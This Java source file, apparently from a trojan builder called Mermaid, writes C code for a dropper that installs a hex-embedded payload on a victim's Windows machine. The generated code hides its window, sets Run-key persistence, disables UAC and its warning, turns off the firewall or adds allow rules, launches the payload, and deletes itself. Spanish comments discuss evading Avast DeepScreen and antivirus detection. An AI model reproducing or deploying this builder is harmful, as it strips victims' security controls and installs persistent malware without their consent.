package net.jlxip.mermaid;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.regex.Pattern;

public class GenerateInstaller {
    public static String generate(File oldFile, String PATH, String FILENAME, String ADFOLDER, String HKCU, String HKLM, String DISABLEUAC, String DISABLEFIREWALL, String ADDFIREWALL, String PORT, String MELT, String HEX){
    	String CFILE = "";	// Creamos un nuevo String global vac�o donde almacenaremos la ruta del c�digo fuente del instalador
        String oldPath = oldFile.getAbsolutePath(); // Creamos un nuevo String con la ruta del troyano recibido por argumentos
        Pattern raw_dot_pattern = Pattern.compile(Pattern.quote("."));  // Creamos un patr�n para separar Strings mediante el delimitador punto
        String[] dots = raw_dot_pattern.split(oldPath); // Creamos un array de Strings separando la variable oldPath
        String installerPath = "";  // Creamos un String vac�o para guardar la ruta del c�digo fuente del instalador
        for(int i=0;i<dots.length;i++){ // Recorremos el array dots
            if(i==dots.length-1){   // Si nos encontramos en la �ltima posici�n...
                installerPath = installerPath + "c";    // A�adimos el car�cter 'c' al final (para la extensi�n .c)
            } else {    // De otro modo...
                installerPath = installerPath + dots[i] + ".";  // A�adimos el string la posici�n actual del array m�s un punto
            }
        }
        
        CFILE = installerPath;  // Guardamos en la variable global la ruta del c�digo fuente
        
        // ARREGLAMOS LA RUTA DE INSTALACI�N EN LA M�QUINA V�CTIMA
        // (para conseguir duplicar los slashes y que funcione el c�digo en lenguaje C)
        String FIXED_PATH = ""; // Creamos una variable vac�a para almacenar la ruta arreglada
        Pattern raw_pathslashes_pattern = Pattern.compile(Pattern.quote("\\"));    // Creamos un nuevo patr�n para separar Strings mediante el delimitador de doble slash \\
        String[] path_slashes = raw_pathslashes_pattern.split(PATH);  // Creamos un array de Strings en el que separamos la variable PATH (recibida por argumentos)
        for(int i=0;i<path_slashes.length;i++){    // Recorremos el array de los slashes
            FIXED_PATH = FIXED_PATH + path_slashes[i] + "\\\\";    // A�adimos a la variable FIXED_PATH la posici�n actual del array y cuatro slashes: \\\\ (dos por estar en java, y otros dos por estar en C)
        }
        
        try{
        	FileWriter FWwriter = new FileWriter(installerPath);
            PrintWriter writer = new PrintWriter(FWwriter);  // Preparamos el archivo del c�digo fuente para ser escrito
            // ESCRIBIR C�DIGO FUENTE DEL INSTALADOR
            writer.println("#define _WIN32_WINNT 0x0500");  // Definimos _WIN32_WINT a 0x0500 para poder ocultar la ventana
            writer.println("#include <windows.h>"); // Inclu�mos la librer�a "windows.h"
            writer.println("#include <stdio.h>");   // Inclu�mos la librer�a "stdio.h"
            writer.println("#include <process.h>"); // Inclu�mos la librer�a "process.h"
            writer.println("int hex_to_int();");    // Definimos "hex_to_int" como un m�todo
            writer.println("int hex_to_ascii();");  // Definimos "hex_to_ascii" como otro m�todo
            writer.println("const char* hex=\""+HEX+"\";"); // Creamos un array de car�cteres constante con el c�digo hexadecimal del payload
            writer.println("main(){");  // Creamos el m�todo main
            writer.println(" ShowWindow(GetConsoleWindow(), SW_HIDE);");    // Lo primero: hacemos la ventana invisible (aun as� se ver� un destello negro del cmd, �Qu� putada!)
            /*
                NOTA
            EN TEOR�A NO HACE FALTA
            ESPERAR 20 SEGUNDOS, YA
            QUE EL AVAST DEEPSCREEN
            NO LO DETECTA.
            */
            //writer.println(" int retTime = time(0) + 20;");    // Esperamos 20 segundos para evitarnos el DeepScreen de AVAST y similares...
            //writer.println(" while(time(0)<retTime);");        // Mientras no haya acabado el tiempo, no hace nada.
            writer.println(" int length = strlen(hex);");   // Creamos una variable de tipo entero para almacenar el tama�o de la constante hexadecimal
            writer.println(" char buf = 0;");   // Creamos un car�cter llamado "buf" y le asignamos el valor de 0
            
            // Procedemos a ver el tipo de ruta
            switch(PATH){
                case "%APPDATA%":   // Si es %APPDATA%...
                    writer.println(" char* path=getenv(\"APPDATA\");"); // Creamos una variable llamada path con la variable de entorno
                    break;
                case "%TEMP%":  // Si es %TEMP%...
                    writer.println(" char* path=getenv(\"TEMP\");");    // Lo mismo...
                    break;
                case "%PROGRAMFILES%":  // Si es %PROGRAMFILES%
                    writer.println(" char* path=getenv(\"PROGRAMFILES\");");    // M�s de lo mismo...
                    break;
                default:    // Si no es nada de lo anterior
                    Pattern raw_upperdots_pattern = Pattern.compile(Pattern.quote("�"));    // Creamos un pattern con el s�mbolo �
                    String[] upperdots = raw_upperdots_pattern.split(PATH); // Creamos un array de Strings separando la variable PATH
                    if(upperdots.length>1){ // Si hay al menos un s�mbolo de ese tipo...
                        if(upperdots[0].equals("ENV")){ // Y detr�s de �l, est� escrito "ENV"...
                            writer.println(" char* path=getenv(\""+upperdots[1]+"\");");    // En la variable metemos la variable de entorno elegida
                        }
                    } else {    // De otro modo...
                        // ARREGLAMOS LA RUTA (Duplicamos los slashes para escaparlos en C)
                        String fixedPATH = "";  // Creamos una variable vac�a
                        Pattern raw_slashes_pattern = Pattern.compile(Pattern.quote("\\"));    // Creamos el patr�n que separa Strings por el slash "\"
                        String[] slashes = raw_slashes_pattern.split(PATH);   // Creamos un array de Strings con las separaciones de slashes de PATH
                        for(int i=0;i<slashes.length;i++){     // Recorremos dicho array...
                            if(i==slashes.length-1){
                                fixedPATH = fixedPATH + slashes[i];        // Si es el �ltimo slash, no a�adimos dicho s�mbolo al final (porque se a�adir� luego, y por estandarizar el tema...)
                            } else {
                                fixedPATH = fixedPATH + slashes[i] + "\\\\";    // Y cada slash lo a�adimos a fixedPATH
                            }
                        }
                        
                        writer.println(" char* path=\""+fixedPATH+"\";");    // Ponemos directamente la ruta
                    }
            }
            
            writer.println(" char toopen[1024];");   // Creamos una variable donde almacenar la ruta del payload con la ruta que hemos sacado antes
            writer.println(" strcat(toopen, path);");  // Lo hacemos
            
            if(!ADFOLDER.equals("NULL")){   // Si se ha seleccionado la carpeta extra
                writer.println(" strcat(toopen, \"\\\\\");");   // A�adimos unos slashes
                writer.println(" strcat(toopen, \""+ADFOLDER+"\");");       // A�adimos el nombre de la carpeta
                writer.println(" mkdir(toopen);");  // La creamos, y seguimos...
            }
            
            writer.println(" strcat(toopen, \"\\\\\");");       // Unos cuantos slashes...
            writer.println(" strcat(toopen, \""+FILENAME+"\");");   // Y el FILENAME elegido
            
            writer.println(" FILE *file = fopen(toopen, \"wb\");");   // Abrimos (creamos) el payload en la ruta elegida para escribir bytes
            
            writer.println(" for(int i=0;i<length;i++){");  // Recorremos los bytes hexadecimales
            writer.println(" 	if(i%2 != 0){");  // Si la posici�n actual es impar...
            writer.println(" 		fprintf(file, \"%c\", hex_to_ascii(buf, hex[i]));");  // Escribimos en el archivo la representaci�n ASCII de la cadena hexadecimal (2 bytes)
            writer.println(" 	} else {");   // De otro modo...
            writer.println(" 		buf = hex[i];");  // Guardamos el car�cter actual en el buffer
            writer.println(" 	}");
            writer.println(" }");
            writer.println(" fclose(file);");   // Cerramos el archivo
            if(!HKCU.equals("NULL")){   // Si se ha elegido un nombre para el HKCU en el registro...
                writer.println(" char hkcutoexecute[2048]=\"REG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\""+HKCU+"\\\" /t REG_SZ /d \\\"\";");
                writer.println(" strcat(hkcutoexecute, toopen);");
                writer.println(" strcat(hkcutoexecute, \"\\\"\");");
                writer.println(" system(hkcutoexecute);"); // A�adimos al registro (HKCU)
            }
            if(!HKLM.equals("NULL")){   // Si se ha elegido un nombre para el HKLM en el registro...
                writer.println(" char hklmtoexecute[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\""+HKLM+"\\\" /t REG_SZ /d \\\"\";");
                writer.println(" strcat(hklmtoexecute, toopen);");
                writer.println(" strcat(hklmtoexecute, \"\\\"\");");
                writer.println(" system(hklmtoexecute);"); // A�adimos al registro (HKLM)
            }
            if(DISABLEUAC.equals("TRUE")){  // Si se ha seleccionado desactivar el UAC...
                writer.println(" char uactoexecute[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System 7v EnableLUA /t REG_DWORD /d 0 /f\";"); // Creamos una variable con el comando a ejecutar para desactivar el UAC
                writer.println(" system(uactoexecute);");   // Lo ejecutamos...
                writer.println(" char warningtoexecuteHKCU[2048]=\"REG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ActionCenter /v ReNotifyCount /t REG_DWORD /d 0 /f\";");   // Creamos una variable con el comando para desactivar la notificaci�n de que el UAC no est� activado
                writer.println(" system(warningtoexecuteHKCU);");   // Lo ejecutamos...
                writer.println(" char warningtoexecuteHKLM[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ActionCenter /v ReNotifyCount /t REG_DWORD /d 0 /f\";");   // Lo mismo que arriba, pero en HKLM
                writer.println(" system(warningtoexecuteHKLM);");   // Lo ejecutamos...
            }
            if(DISABLEFIREWALL.equals("TRUE") || !ADDFIREWALL.equals("NULL")){ // Si se ha seleccionado desactivar el Firewall o a�adir una excepci�n...
                writer.println(" char* envvar_temp=getenv(\"TEMP\");"); // Creamos una variable con la variable de entorno "TEMP"
                writer.println(" char txt_path[1024]=\"\";");    // Creamos una variable vac�a para meter la ruta del txt que vamos a crear
                writer.println(" strcat(txt_path, envvar_temp);");      // Concatenamos envvar_temp
                writer.println(" strcat(txt_path, \"\\\\config.txt\");");       // Unos slashes, y "config.txt"
                /*
                A T E N C I � N
                ---------------
                En alg�n momento puede llegar a ser detectado el archivo %TEMP%\config.txt por los antivirus,
                ya que es completamente constante. Con esto llegamos a la siguiente conclusi�n:
                TODO: PERMITIR AL USUARIO INTRODUCIR EL NOMBRE DEL BAT
                */
                writer.println(" char checkver[1024]=\"\";");
                writer.println(" strcat(checkver, \"for /f \\\"tokens=2 delims=\\\\ \\\" %a in (\\\"%USERPROFILE%\\\") do (echo %a)>\");");
                writer.println(" strcat(checkver, txt_path);");
                writer.println(" system(checkver);");
                writer.println(" FILE *txt=fopen(txt_path, \"r\");");   // Abrimos el archivo txt para averiguar si la versi�n de Windows es XP o superior
                writer.println(" char winver_output[512]=\"\";");
                writer.println(" fgets(winver_output, 80, txt);");
                writer.println(" fclose(txt);");    // Cerramos el archivo y guardamos los cambios
                
                if(DISABLEFIREWALL.equals("TRUE")){ // Si se ha seleccionado desactivar el Firewall...
                	writer.println(" if(strcmp(winver_output,\"Documents\\n\")==0){");   // Si la versi�n de Windows es XP..
                    writer.println("  system(\"netsh firewall set opmode disable\");"); // Desactivamos el Firewall
                    writer.println(" } else {");    // De otro modo...
                    writer.println("  system(\"netsh advfirewall set allprofiles state off\");");   // Descativamos el Firewall
                    /*
                    A T E N C I � N
                    ---------------
                    El comando de arriba puede dejar de funcionar en versiones de Windows superiores a Windows 10
                    Si hace falta, lo cambiar�. Pero ahora mismo funciona para versiones superiores a Windows XP
                    */
                    writer.println(" }");
                }
                
                if(!ADDFIREWALL.equals("NULL")){ // Si se ha seleccionado a�adir excepci�n al Firewall...
                    writer.println(" if(strcmp(winver_output,\"Documents\\n\")==0){");   // Si es Windows XP...
                    writer.println("  system(\"netsh firewall add portopening TCP "+PORT+" "+ADDFIREWALL+"\");");   // A�adimos la excepci�n
                    writer.println(" } else {");    // De otro modo...
                    writer.println("  char addfirewall_out[1024]=\"netsh advfirewall firewall add rule name=\\\""+ADDFIREWALL+"\\\" dir=out program=\\\"\";");  // Creamos una variable con parte del comando
                    writer.println("  strcat(addfirewall_out, toopen);");   // Le concatenamos la ruta del payload
                    writer.println("  strcat(addfirewall_out, \"\\\" protocol=tcp action=allow\");");       // Unos par�metros m�s...
                    writer.println("  system(addfirewall_out);");   // Y lo ejecutamos
                    writer.println("  char addfirewall_in[1024]=\"netsh advfirewall firewall add rule name=\\\""+ADDFIREWALL+"\\\" dir=in program=\\\"\";");
                    writer.println("  strcat(addfirewall_in, toopen);");
                    writer.println("  strcat(addfirewall_in, \"\\\" protocol=tcp action=allow\");");
                    writer.println("  system(addfirewall_in);");
                    writer.println(" }");
                }
            }
            writer.println(" spawnl(P_NOWAIT, toopen, toopen, NULL);");   // Ejecutamos el payload sin esperar a que termine
            if(MELT.equals("TRUE")){    // Si se ha seleccionado la opci�n Melt...
                writer.println(" wchar_t exebuffer[MAX_PATH];");    // Creamos una variable wchar_t para la ruta del instalador
                writer.println(" GetModuleFileName(NULL, exebuffer, MAX_PATH);");   // Obtenemos la ruta del instalador
                
                writer.println(" char melt[1024]=\"cmd.exe /c ping -n 2 0.0.0.0 & del \\\"\";");    // Creamos una variable con el comando a ejecutar
                writer.println(" strcat(melt, exebuffer);");    // Le a�adimos la ruta del instalador
                writer.println(" strcat(melt, \"\\\" & del %%0\");"); // Y unos slashes, junto a eliminarse a s� mismo
                
                writer.println(" char* melt_envvar_temp=getenv(\"TEMP\");"); // Creamos una variable con la variable de entorno "TEMP"
                writer.println(" char meltbat[1024]=\"\";");    // Creamos una variable vac�a para introducir la ruta del archivo m.bat
                writer.println(" strcat(meltbat, melt_envvar_temp);");  // Le concatenamso la variable %TEMP%
                writer.println(" strcat(meltbat, \"\\\\m.bat\");"); // Unos slashes, y "m.bat"
                /*
                A T E N C I � N
                ---------------
                En alg�n momento puede llegar a ser detectado el archivo %TEMP%\m.bat por los antivirus,
                ya que es completamente constante. Con esto llegamos a la siguiente conclusi�n:
                TODO: PERMITIR AL USUARIO INTRODUCIR EL NOMBRE DEL BAT
                */
                
                writer.println(" FILE *fmeltbat=fopen(meltbat, \"w\");");   // Abrimos el archivo ".bat" como escritura
                writer.println(" fprintf(fmeltbat, melt);");    // Escribimos en �l el c�digo
                writer.println(" fclose(fmeltbat);");   // Y cerramos
                
                writer.println(" spawnl(P_NOWAIT, meltbat, meltbat, NULL);");   // Por �ltimo, ejecutamos "m.bat" sin esperar a que termine
            }
            writer.println(" return 0;");   // Cerramos el instalador
            
            writer.println("}");
            writer.println("int hex_to_int(char c){");  // FUNCI�N PARA CONVERTIR HEXADECIMAL A N�MERO ENTERO
            writer.println(" int first = c / 16 - 3;");             // He de admitir que, de nuevo, no s� como funciona esto.
            writer.println(" int second = c % 16;");                // Lo encontr� en este StackOverflow:
            writer.println(" int result = first*10 + second;");     // http://goo.gl/v4wfDp
            writer.println(" if(result > 9) result--;");            // 
            writer.println(" return result;");                      // �Perd�n por el desconocimiento! :S
            writer.println("}");                                    //
            writer.println("int hex_to_ascii(char c, char d){"); // FUNCI�N PARA CONVERTIR HEXADECIMAL A ASCII
            writer.println(" int high = hex_to_int(c) * 16;");      //
            writer.println(" int low = hex_to_int(d);");            //
            writer.println(" return high+low;");                    //
            writer.println("}");                                    //
            writer.close(); // Cerramos el archivo
            FWwriter.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        
        return CFILE;   // Devolvemos la variable global con la ruta (CFILE)
    }
}
